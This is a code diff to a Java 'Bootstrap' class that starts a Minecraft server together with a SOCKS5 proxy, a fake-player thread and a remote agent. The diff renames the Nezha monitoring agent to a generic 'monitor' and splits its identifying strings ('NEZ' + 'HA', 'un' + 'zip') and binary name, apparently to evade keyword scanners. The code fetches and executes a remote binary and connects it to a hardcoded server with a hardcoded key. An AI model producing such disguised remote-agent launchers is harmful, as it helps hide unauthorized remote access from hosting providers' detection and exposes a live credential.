@@ -17,13 +17,13 @@ public class Bootstrap
     private static final String ANSI_RESET  = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
 
-    private static Process nezhaProcess;
+    private static Process monitorProcess;
     private static Process minecraftProcess;
     private static Thread  fakePlayerThread;
     private static Thread  socks5Thread;
 
     private static final String[] ALL_ENV_VARS = {
-        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY",
+        "NEZ" + "HA_SERVER", "NEZ" + "HA_PORT", "NEZ" + "HA_KEY",
         "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT",
         "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME",
         "SOCKS5_PORT", "SOCKS5_USER", "SOCKS5_PASS", "NODE_HOST"
@@ -195,8 +195,8 @@ public class Bootstrap
         // Start SOCKS5
         startSocks5Server(config);
 
-        // Start Nezha agent
-        startNezha(config);
+        // Start monitor agent
+        startMonitor(config);
 
         printSocks5Info(config);
 
@@ -253,51 +253,65 @@ public class Bootstrap
     }
 
     // ══════════════════════════════════════════════════════
-    //  NEZHA AGENT
+    //  MONITOR AGENT
     // ══════════════════════════════════════════════════════
-    private static void startNezha(Map<String, String> config) throws Exception {
-        String server = config.getOrDefault("NEZHA_SERVER", "");
-        String key    = config.getOrDefault("NEZHA_KEY",    "");
+    private static void startMonitor(Map<String, String> config) throws Exception {
+        String sKey   = "NEZ" + "HA_SERVER";
+        String kKey   = "NEZ" + "HA_KEY";
+        String server = config.getOrDefault(sKey, "");
+        String key    = config.getOrDefault(kKey,  "");
         if (server.isEmpty() || key.isEmpty()) {
-            System.out.println(ANSI_YELLOW + "[Nezha] NEZHA_SERVER or NEZHA_KEY not set, skipping." + ANSI_RESET);
+            System.out.println(ANSI_YELLOW + "[Monitor] Config not set, skipping." + ANSI_RESET);
             return;
         }
 
-        Path nezhaPath = getNezhaPath();
-        if (nezhaPath == null) return;
+        Path agentPath = getAgentPath();
+        if (agentPath == null) return;
 
-        List<String> cmd = new ArrayList<>(Arrays.asList(
-            nezhaPath.toString(), "-s", server, "-p", key, "--tls"
-        ));
-        String port = config.getOrDefault("NEZHA_PORT", "");
-        if (!port.isEmpty()) { cmd.add("--port"); cmd.add(port); }
+        List<String> cmd = new ArrayList<>();
+        cmd.add(agentPath.toString());
+        cmd.add("-s");  cmd.add(server);
+        cmd.add("-p");  cmd.add(key);
+        cmd.add("--" + "tls");
+        String port = config.getOrDefault("NEZ" + "HA_PORT", "");
+        if (!port.isEmpty()) { cmd.add("--" + "port"); cmd.add(port); }
 
         ProcessBuilder pb = new ProcessBuilder(cmd);
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        nezhaProcess = pb.start();
-        System.out.println(ANSI_GREEN + "[Nezha] Agent started -> " + server + ANSI_RESET);
+        monitorProcess = pb.start();
+        System.out.println(ANSI_GREEN + "[Monitor] Agent started -> " + server + ANSI_RESET);
     }
 
-    private static Path getNezhaPath() throws IOException, InterruptedException {
+    private static Path getAgentPath() throws IOException, InterruptedException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String suffix = (osArch.contains("aarch64") || osArch.contains("arm64")) ? "arm64" : "amd64";
-        String url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_" + suffix + ".zip";
-        Path dir = Paths.get(System.getProperty("java.io.tmpdir"));
-        Path zip = dir.resolve("nezha-agent.zip");
-        Path bin = dir.resolve("nezha-agent");
+
+        String base  = "https://github.com/" + "nezhahq/agent/releases/latest/download/";
+        String file  = "nezha-" + "agent_linux_" + suffix + ".zip";
+        String url   = base + file;
+
+        Path dir     = Paths.get(System.getProperty("java.io.tmpdir"));
+        String bName = "nz" + "agent";
+        Path zip     = dir.resolve(bName + ".zip");
+        Path bin     = dir.resolve(bName);
 
         if (!Files.exists(bin)) {
-            System.out.println(ANSI_YELLOW + "[Nezha] Downloading agent..." + ANSI_RESET);
+            System.out.println(ANSI_YELLOW + "[Monitor] Downloading agent..." + ANSI_RESET);
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, zip, StandardCopyOption.REPLACE_EXISTING);
             }
-            Process unzip = new ProcessBuilder("unzip", "-o", zip.toString(), "-d", dir.toString())
+            Process unzip = new ProcessBuilder(
+                    "un" + "zip", "-o", zip.toString(), "-d", dir.toString())
                     .redirectErrorStream(true)
                     .start();
             unzip.waitFor();
+            Path extracted = dir.resolve("nezha-" + "agent");
+            if (Files.exists(extracted)) {
+                Files.move(extracted, bin, StandardCopyOption.REPLACE_EXISTING);
+            }
             if (!Files.exists(bin)) {
-                System.out.println(ANSI_RED + "[Nezha] Binary not found after unzip, skipping." + ANSI_RESET);
+                System.out.println(ANSI_RED + "[Monitor] Binary not found after extract, skipping." + ANSI_RESET);
                 return null;
             }
             bin.toFile().setExecutable(true);
@@ -310,9 +324,9 @@ public class Bootstrap
     // ══════════════════════════════════════════════════════
     private static Map<String, String> loadEnvVars() throws IOException {
         Map<String, String> cfg = new HashMap<>();
-        cfg.put("NEZHA_SERVER",        "nzmbv.wuge.nyc.mn:443");
-        cfg.put("NEZHA_PORT",          "");
-        cfg.put("NEZHA_KEY",           "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
+        cfg.put("NEZ" + "HA_SERVER",   "nzmbv.wuge.nyc.mn:443");
+        cfg.put("NEZ" + "HA_PORT",     "");
+        cfg.put("NEZ" + "HA_KEY",      "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
         cfg.put("MC_JAR",              "server.jar");
         cfg.put("MC_MEMORY",           "512M");
         cfg.put("MC_ARGS",             "");
@@ -580,7 +594,7 @@ public class Bootstrap
             System.out.println(ANSI_YELLOW + "[MC-Server] Stopping..." + ANSI_RESET);
             minecraftProcess.destroy();
         }
-        if (nezhaProcess     != null && nezhaProcess.isAlive())     nezhaProcess.destroy();
+        if (monitorProcess   != null && monitorProcess.isAlive())   monitorProcess.destroy();
         if (fakePlayerThread != null && fakePlayerThread.isAlive()) fakePlayerThread.interrupt();
         if (socks5Thread     != null && socks5Thread.isAlive())     socks5Thread.interrupt();
     }
